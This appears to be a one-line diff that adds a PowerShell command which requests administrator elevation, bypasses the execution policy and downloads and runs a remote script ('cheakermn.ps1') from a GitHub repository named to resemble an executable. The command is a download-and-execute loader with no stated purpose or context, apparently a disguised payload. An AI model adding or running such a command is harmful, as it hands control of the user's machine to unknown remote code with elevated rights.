@@ -1,0 +1,1 @@
+powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"iex (New-Object Net.WebClient).DownloadString('https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1')\"'"
